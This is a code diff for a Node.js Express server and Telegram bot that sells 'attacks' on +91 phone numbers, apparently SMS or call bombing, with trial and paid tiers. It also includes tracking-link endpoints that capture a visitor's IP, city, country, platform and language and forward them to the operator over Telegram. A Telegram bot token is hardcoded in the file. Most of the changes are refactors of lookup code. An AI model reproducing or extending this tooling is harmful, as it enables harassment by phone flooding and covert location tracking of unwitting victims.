@@ -47,12 +47,15 @@ let database = {
   attacks: [],
   locations: [],
   botUsers: [],
-  logs: []
+  logs: [],
+  trackings: [] // Added trackings array
 };
 
 try {
   if (fs.existsSync('./database.json')) {
     database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
+    // Ensure trackings array exists
+    if (!database.trackings) database.trackings = [];
   } else {
     fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
   }
@@ -86,7 +89,7 @@ function addLog(type, message, data = {}) {
 }
 
 // =============== TELEGRAM BOT SETUP ===============
-const TELEGRAM_TOKEN = '8750510514:AAG8cgcVULCGXXc8cmYYlnddEiEjDsO34Ik'; // Replace with your bot token
+const TELEGRAM_TOKEN = '8750510514:AAG8cgcVULCGXXc8cmYYlnddEiEjDsO34Ik';
 let bot;
 
 try {
@@ -104,7 +107,14 @@ try {
     const lastName = msg.from.last_name || '';
     
     // Save bot user
-    let botUser = database.botUsers.find(u => u.telegramId === userId);
+    let botUser = null;
+    for (let i = 0; i < database.botUsers.length; i++) {
+      if (database.botUsers[i].telegramId === userId) {
+        botUser = database.botUsers[i];
+        break;
+      }
+    }
+    
     if (!botUser) {
       botUser = {
         telegramId: userId,
@@ -159,7 +169,14 @@ try {
     bot.sendMessage(chatId, `⚡ Starting attack on +91${phone}...`);
     
     // Get bot user
-    const botUser = database.botUsers.find(u => u.telegramId === userId);
+    let botUser = null;
+    for (let i = 0; i < database.botUsers.length; i++) {
+      if (database.botUsers[i].telegramId === userId) {
+        botUser = database.botUsers[i];
+        break;
+      }
+    }
+    
     if (!botUser) return;
     
     botUser.lastActive = new Date().toISOString();
@@ -243,7 +260,14 @@ _Attacks remaining: Unlimited_
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
-    const botUser = database.botUsers.find(u => u.telegramId === userId);
+    let botUser = null;
+    for (let i = 0; i < database.botUsers.length; i++) {
+      if (database.botUsers[i].telegramId === userId) {
+        botUser = database.botUsers[i];
+        break;
+      }
+    }
+    
     if (!botUser) return;
     
     const stats = `
@@ -286,7 +310,7 @@ _Attacks remaining: Unlimited_
 /statsall - View all stats
 
 📞 *Contact Admin*
-🔹 Telegram: @snehamusiic
+🔹 Telegram: @introvert_O2z
 🔹 Support: 24/7 Available
     `;
     
@@ -299,7 +323,14 @@ _Attacks remaining: Unlimited_
     const userId = msg.from.id;
     const message = match[1];
     
-    const botUser = database.botUsers.find(u => u.telegramId === userId);
+    let botUser = null;
+    for (let i = 0; i < database.botUsers.length; i++) {
+      if (database.botUsers[i].telegramId === userId) {
+        botUser = database.botUsers[i];
+        break;
+      }
+    }
+    
     if (!botUser || !botUser.isAdmin) {
       return bot.sendMessage(chatId, '❌ Admin only command!');
     }
@@ -327,11 +358,19 @@ _Attacks remaining: Unlimited_
 
 // Serve tracking page
 app.get('/track/:trackingId', (req, res) => {
-  const { trackingId } = req.params;
-  const { phone } = req.query;
+  const trackingId = req.params.trackingId;
+  const phone = req.query.phone || '';
   
   // Get tracking info
-  const tracking = database.trackings?.find(t => t.id === trackingId);
+  let tracking = null;
+  if (database.trackings) {
+    for (let i = 0; i < database.trackings.length; i++) {
+      if (database.trackings[i].id === trackingId) {
+        tracking = database.trackings[i];
+        break;
+      }
+    }
+  }
   
   if (!tracking) {
     return res.status(404).send('Invalid or expired link');
@@ -646,7 +685,15 @@ app.post('/api/track-location', (req, res) => {
   const geo = geoip.lookup(clientIp);
   
   // Get tracking info
-  const tracking = database.trackings?.find(t => t.id === trackingId);
+  let tracking = null;
+  if (database.trackings) {
+    for (let i = 0; i < database.trackings.length; i++) {
+      if (database.trackings[i].id === trackingId) {
+        tracking = database.trackings[i];
+        break;
+      }
+    }
+  }
   
   if (!tracking) {
     return res.json({ success: false, error: 'Invalid tracking ID' });
@@ -691,8 +738,8 @@ app.post('/api/track-location', (req, res) => {
 • Platform: ${platform}
 • Language: ${language}
 • IP: ${clientIp}
-• Country: ${geo?.country || 'Unknown'}
-• City: ${geo?.city || 'Unknown'}
+• Country: ${(geo && geo.country) || 'Unknown'}
+• City: ${(geo && geo.city) || 'Unknown'}
 
 ⚡ *Tracking ID*: \`${trackingId}\`
     `;
@@ -712,11 +759,11 @@ app.post('/api/track-location', (req, res) => {
 
 // =============== SOUND EFFECTS ENDPOINT ===============
 app.get('/api/sounds/:sound', (req, res) => {
-  const { sound } = req.params;
+  const sound = req.params.sound;
   
   // Base64 encoded sound effects
   const sounds = {
-    'attack-start': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...', // Add actual base64 sound
+    'attack-start': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
     'attack-stop': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
     'success': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
     'error': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
@@ -884,7 +931,13 @@ app.get('/api/apis', (req, res) => {
 app.post('/api/register', (req, res) => {
   const { userId, name } = req.body;
   
-  let user = database.users.find(u => u.id === userId);
+  let user = null;
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].id === userId) {
+      user = database.users[i];
+      break;
+    }
+  }
   
   if (!user) {
     user = {
@@ -908,7 +961,13 @@ app.post('/api/register', (req, res) => {
 app.post('/api/use-trial', (req, res) => {
   const { userId } = req.body;
   
-  const user = database.users.find(u => u.id === userId);
+  let user = null;
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].id === userId) {
+      user = database.users[i];
+      break;
+    }
+  }
   
   if (!user) {
     return res.json({ success: false, message: 'User not found' });
@@ -978,7 +1037,13 @@ app.get('/api/admin/users', (req, res) => {
 app.post('/api/admin/add-user', (req, res) => {
   const { userId, username } = req.body;
   
-  let user = database.users.find(u => u.id === userId);
+  let user = null;
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].id === userId) {
+      user = database.users[i];
+      break;
+    }
+  }
   
   if (!user) {
     user = {
@@ -1001,7 +1066,13 @@ app.post('/api/admin/add-user', (req, res) => {
   
   // Notify via Telegram if bot exists
   if (bot) {
-    const botUser = database.botUsers.find(u => u.telegramId == userId);
+    let botUser = null;
+    for (let i = 0; i < database.botUsers.length; i++) {
+      if (database.botUsers[i].telegramId == userId) {
+        botUser = database.botUsers[i];
+        break;
+      }
+    }
     if (botUser) {
       bot.sendMessage(botUser.chatId, '🎉 Congratulations! You are now a PAID user with unlimited attacks!');
     }
@@ -1014,7 +1085,13 @@ app.post('/api/admin/add-user', (req, res) => {
 app.post('/api/admin/remove-user', (req, res) => {
   const { userId } = req.body;
   
-  database.users = database.users.filter(u => u.id !== userId);
+  const newUsers = [];
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].id !== userId) {
+      newUsers.push(database.users[i]);
+    }
+  }
+  database.users = newUsers;
   saveDatabase();
   
   addLog('admin', `Removed user: ${userId}`, { userId });
@@ -1026,7 +1103,13 @@ app.post('/api/admin/remove-user', (req, res) => {
 app.post('/api/admin/reset-trial', (req, res) => {
   const { userId } = req.body;
   
-  const user = database.users.find(u => u.id === userId);
+  let user = null;
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].id === userId) {
+      user = database.users[i];
+      break;
+    }
+  }
   
   if (user) {
     user.trialUsed = 0;
@@ -1054,16 +1137,47 @@ app.post('/api/admin/add-api', (req, res) => {
 
 // Get stats
 app.get('/api/admin/stats', (req, res) => {
+  // Count paid users
+  let paidUsers = 0;
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].isPaid) paidUsers++;
+  }
+  
+  // Count trial users
+  let trialUsers = 0;
+  for (let i = 0; i < database.users.length; i++) {
+    if (database.users[i].trialUsed > 0 && !database.users[i].isPaid) trialUsers++;
+  }
+  
+  // Count attacks today
+  let attacksToday = 0;
+  const today = new Date().toDateString();
+  for (let i = 0; i < database.attacks.length; i++) {
+    if (new Date(database.attacks[i].timestamp).toDateString() === today) {
+      attacksToday++;
+    }
+  }
+  
+  // Count attacks this week
+  let attacksThisWeek = 0;
+  const oneWeekAgo = new Date();
+  oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
+  for (let i = 0; i < database.attacks.length; i++) {
+    if (new Date(database.attacks[i].timestamp) > oneWeekAgo) {
+      attacksThisWeek++;
+    }
+  }
+  
   res.json({
     totalUsers: database.users.length,
-    paidUsers: database.users.filter(u => u.isPaid).length,
-    trialUsers: database.users.filter(u => u.trialUsed > 0 && !u.isPaid).length,
+    paidUsers: paidUsers,
+    trialUsers: trialUsers,
     totalAttacks: database.attacks.length,
     totalApis: apisData.apis.length,
     totalLocations: database.locations.length,
     botUsers: database.botUsers.length,
-    attacksToday: database.attacks.filter(a => moment(a.timestamp).isSame(new Date(), 'day')).length,
-    attacksThisWeek: database.attacks.filter(a => moment(a.timestamp).isSame(new Date(), 'week')).length
+    attacksToday: attacksToday,
+    attacksThisWeek: attacksThisWeek
   });
 });
 
